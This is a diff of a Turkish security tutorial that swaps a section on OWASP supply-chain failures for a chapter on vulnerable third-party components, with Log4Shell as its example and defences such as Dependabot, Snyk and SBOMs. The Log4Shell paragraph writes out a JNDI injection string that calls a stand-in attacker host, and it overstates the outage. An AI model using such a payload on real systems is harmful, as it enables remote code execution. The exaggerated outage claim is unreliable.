@@ -1,21 +1,19 @@
-# A03:2025 - Software Supply Chain Failures (Yazılım Tedarik Zinciri Hataları)
+# Bölüm 05: A06 - Vulnerable and Outdated Components (Savunmasız Bileşenler)
 
-**2025'in yıldızı ve en sinsi saldırı türüdür.** Eski adıyla "Vulnerable Components" olan bu kategori, CI/CD pipeline'larının ve geliştirme ortamlarının yaygınlaşmasıyla devasa bir "Tedarik Zinciri" sorununa dönüştü.
+Modern yazılımların sadece %10-20'si sizin yazdığınız koddur. Kalan %80-90'ı ise NPM (Node), NuGet (C#) veya Pip (Python) gibi paket yöneticilerinden indirdiğiniz "Başka Geliştiricilerin (Third-Party)" yazdığı hazır kütüphanelerdir (Bileşenler).
 
----
+Siz kodunuzu mükemmel ve güvenli yazsanız bile, projenizde kullandığınız bir "Resim kırpma eklentisinin" içinde bir açık varsa, hacker o eklenti üzerinden tüm projenize sızabilir. (Buna Supply Chain / Tedarik Zinciri Saldırısı denir).
 
-## 1. Zafiyetin Mantığı
-Kalenizin duvarlarını (Uygulamanızı) inanılmaz kalın ve güvenli yaptınız. Hacker dışarıdan içeri giremiyor. 
-O zaman Hacker ne yapar? Kalenin içine yiyecek taşıyan tüccarların (NPM/NuGet/PyPI Paketleri veya CI/CD Sunucuları) arabasına saklanıp, kaleye **sizin tarafınızdan güvenle taşınmasını** sağlar.
+## 1. Meşhur Tarihi Olay: Log4j Krizi (Log4Shell - 2021)
+Dünya üzerindeki Java uygulamalarının ve devasa şirketlerin (Minecraft, Apple, Twitter, Steam) kullandığı "Log4j" adlı basit bir loglama kütüphanesinde inanılmaz bir açık keşfedildi.
+Saldırganlar Minecraft'ın chat ekranına bile saçma sapan bir komut `${jndi:ldap://hacker.com/malware}` yazarak koskoca sunucuları ele geçirdiler. Dünyadaki sunucuların yarısı bu "Savunmasız üçüncü parti bileşen" yüzünden haftalarca kapalı kaldı.
 
-Yani saldırı doğrudan size değil, **kullandığınız araçlara (tedarikçilerinize)** yapılır.
+## 2. Neden Olur?
+- Projeye başlarken bir paket (Örn: `Newtonsoft.Json v10.0`) indirirsiniz ve 5 yıl boyunca projeyi güncellersiniz ama o paketi ASLA güncellemezsiniz. Paketin o versiyonunda açıklar bulunur ama sizin haberiniz olmaz.
+- Projede hangi kütüphanelerin kullanıldığına dair bir envanter (Software Bill of Materials - SBOM) tutmazsınız.
 
-## 2. En Sık Görülen Saldırı Tipleri
-- **Dependency Confusion & Typo Squatting:** Geliştiricilerin sıklıkla kullandığı `react-router` paketinin ismini `react-ruter` şeklinde zararlı bir kodla npm kütüphanesine yüklerler. Yazılımcı yanlışlıkla bunu indirirse virüs geliştiricinin bilgisayarına veya sunucusuna (CI/CD) girer.
-- **Pipeline Zehirlenmesi (Pipeline Poisoning):** Şirketin Jenkins veya GitHub Actions sunucularına sızıp, derleme anında (Build) koda gizli zararlılar (Backdoor) enjekte ederler (Bknz: Tarihin en büyük hack olayı olan SolarWinds Saldırısı).
-- **Zafiyetli (Eski) Kütüphaneler:** Kodunuzun içinde kullandığınız yüzlerce açık kaynaklı kütüphaneden (Örn: Log4j) birinde çıkan sıfırıncı gün (0-day) zafiyeti tüm sisteminizi ele geçirir.
+## 3. Nasıl Engellenir (Savunma)?
 
-## 3. Nasıl Korunuruz? (Mimari Savunma)
-1. **SCA (Software Composition Analysis) Kullanın:** Projenizdeki tüm kütüphaneleri (Dependencies) tarayan araçlar (Dependabot, Snyk, OWASP Dependency-Check) kullanarak eski veya zafiyetli paketleri anında tespit edin.
-2. **SBOM (Software Bill of Materials):** Yazılımınızın "İçindekiler Listesini" çıkarın. İçinde tam olarak hangi paketlerin hangi versiyonlarının yaşadığını haritalandırın.
-3. **CI/CD Güvenliği:** Geliştiricilerin CI/CD pipeline'ını değiştirmesine kısıtlamalar (Code Review zorunluluğu) getirin. Derleme ortamının dış internetle bağlantısını kısıtlayın.
+- **Sürekli İzleme (Continuous Monitoring):** Geliştirme ortamınızda (Örn: GitHub) "Dependabot" veya "Snyk" gibi botları açarsınız. Bu botlar projenizin içindeki kütüphaneleri (package.json) her gece okur. Eğer eski bir versiyon varsa size otomatik uyarı maili atar: *"DİKKAT! Kullandığınız 'moment.js' versiyon 2.1'de ölümcül açık bulundu. Lütfen hemen 2.2 sürümüne güncelleyin!"*
+- **Sadece Güvenilir Kaynaklar:** GitHub'da 3 yıldızı olan, kimin yazdığı belli olmayan rastgele NPM paketlerini asla ticari projelerinize dahil etmeyin.
+- **Kullanılmayanları Silin:** "Belki lazım olur" diye yüklediğiniz ama hiç kodunu yazmadığınız tüm kütüphaneleri projeden (Uninstall) kaldırın. Olmayan bir şey Hacklenemez.
